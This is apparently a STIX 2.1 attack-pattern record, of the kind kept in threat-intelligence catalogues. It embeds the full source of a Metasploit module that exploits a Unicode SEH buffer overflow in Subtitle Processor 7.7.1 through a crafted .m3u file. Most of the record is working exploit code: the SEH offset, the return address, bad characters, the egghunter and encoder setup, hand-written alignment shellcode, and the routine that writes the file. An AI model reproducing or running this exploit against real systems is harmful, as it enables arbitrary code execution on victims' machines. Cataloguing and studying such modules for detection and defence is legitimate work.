{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f1be9776-4254-4c0f-a14a-2031987bfaad",
    "created": "2024-08-14T16:37:46.154337Z",
    "modified": "2024-08-14T16:37:46.154341Z",
    "name": "\"Subtitle Processor 7.7.1 .M3U SEH Unicode Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Subtitle Processor 7.  By supplying a long string of data as a .m3u file, Subtitle Processor first converts this input in Unicode, which expands the string size, and then attempts to copy it inline on the stack.  This results a buffer overflow with SEH overwritten, allowing arbitrary code execution.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/subtitle_processor_m3u_bof.rb",
            "external_id": "subtitle_processor_m3u_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://sourceforge.net/projects/subtitleproc/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Egghunter\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Subtitle Processor 7.7.1 .M3U SEH Unicode Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in Subtitle Processor 7.  By\n        supplying a long string of data as a .m3u file, Subtitle Processor first converts\n        this input in Unicode, which expands the string size, and then attempts to copy it\n        inline on the stack.  This results a buffer overflow with SEH overwritten, allowing\n        arbitrary code execution.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brandon Murphy',  #Initial discovery, poc\n          'sinn3r',          #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '72050' ],\n          [ 'EDB', '17217' ],\n          [ 'URL', 'http://sourceforge.net/projects/subtitleproc/' ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars'        => \"\\x00\\x0a\\x0c\\x0d\\x1a\\x3a\\x5c\\x80\",\n          'StackAdjustment' => -3500,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"seh\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP SP3',\n            {\n              'Nop'    => \"\\x43\",  #ADD BYTE PTR DS:[EBX],AL\n              'Offset' => 4078,    #Offset to SEH chain\n              'Ret'    => 0x57b4,  #Unicode compatible P/P/R (Subtitle.exe)\n              'Max'    => 6000     #Max buffer size\n            },\n          ],\n        ],\n      'Privileged'     => false,\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-04-26' ))\n\n      register_options(\n        [\n          OptString.new('FILENAME', [false, 'M3U filename', 'msf.m3u'])\n        ])\n  end\n\n  def get_unicode_payload(p, opts)\n    encoder = framework.encoders.create(\"x86/alpha_mixed\")\n    encoder.datastore.import_options_from_hash({'BufferRegister' => opts[:AlphaNumRegister] })\n    alpha_payload = encoder.encode(p, nil, nil, platform)\n\n    # This code can be found after the unicode payload is decoded\n    alignment = opts[:PrependAlignment] || \"\"\n\n    encoder = framework.encoders.create(\"x86/unicode_mixed\")\n    encoder.datastore.import_options_from_hash( {'BufferRegister'=> opts[:UnicodeRegister] })\n    unicode_payload = encoder.encode(alignment + alpha_payload, nil, nil, platform)\n    return unicode_payload\n  end\n\n  def exploit\n    nop = target['Nop']\n    sploit = ''\n\n    hunter, p = generate_egghunter(payload.encoded, payload_badchars, { :checksum => false })\n\n    opts = {\n      :AlphaNumRegister => 'EAX',\n      :UnicodeRegister  => 'ECX',\n      # PUSH EBX; POP EAX; XOR AX, 0x4450; XOR AX, 0x4634; DEC EAX; XOR AL, 0x41; XOR AL, 0x57\n      :PrependAlignment => \"\\x53\\x58\\x66\\x35\\x50\\x44\\x66\\x35\\x34\\x46\\x48\\x34\\x41\\x34\\x57\"\n    }\n    hunter = get_unicode_payload(hunter, opts)\n\n    sploit << rand_text_alpha(target['Offset'])\n    sploit << \"\\x61\"\n    sploit << nop\n    sploit << [target.ret].pack('V*')\n    sploit << nop\n    # first stage starts here\n    sploit << \"\\x59\"     #POP ECX\n    sploit << nop\n    sploit << \"\\x54\"     #PUSH ESP\n    sploit << nop\n    sploit << \"\\x59\"     #POP ECX\n    sploit << \"\\x41\"     #ADD BYTE PTR DS:[ECX], AL\n    sploit << \"\\x59\"     #POP ECX\n    sploit << nop\n    sploit << \"\\x51\"     #PUSH ECX\n    sploit << nop\n    sploit << \"\\xc3\"     #RET\n    sploit << rand_text_alpha(48)\n    sploit << hunter\n    sploit << rand_text_alpha(200)\n    sploit << p\n    sploit << rand_text_alpha(target['Max']-sploit.length)\n\n    #Generate file\n    print_status(\"Creating #{datastore['FILENAME']}...\")\n    file_create(sploit)\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-04-26 ",
    "x_mitre_platforms": [
        "win'"
    ]
}